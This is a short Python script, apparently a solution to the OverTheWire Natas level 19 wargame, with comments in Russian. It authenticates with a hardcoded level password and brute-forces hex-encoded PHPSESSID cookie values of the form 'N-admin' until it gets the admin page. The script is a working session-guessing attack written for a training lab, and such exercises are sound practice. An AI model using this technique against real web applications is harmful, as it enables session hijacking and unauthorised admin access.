import requests
import binascii

username = 'natas19'
password = 'qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT'   # пароль для natas19
url      = 'http://natas19.natas.labs.overthewire.org/'   # БЕЗ user:pass@ !
auth     = (username, password)
trueStr  = 'You are an admin.'

# 1) Проверим авторизацию
test = requests.get(url, auth=auth)
print('HTTP статус:', test.status_code)
if test.status_code == 401:
    print('❌ 401 — пароль всё ещё неверный.')
    raise SystemExit
print('✅ Авторизация прошла, начинаем перебор...\n')

# 2) Перебор сессий 0..640
for x in range(0, 641):
    if x % 50 == 0:
        print(f'Проверено: {x}')

    session_text = f'{x}-admin'
    session_hex  = binascii.hexlify(session_text.encode('ascii')).decode('ascii')
    cookies      = {'PHPSESSID': session_hex}

    r = requests.get(url, auth=auth, cookies=cookies)

    if trueStr in r.text:
        print(f'\n[+] НАШЛИ! Номер сессии: {x}')
        print(f'    PHPSESSID (hex): {session_hex}')
        print('\n--- Ответ сервера ---')
        print(r.text)
        break
else:
    print('\n[-] Не найдено в диапазоне 0–640.')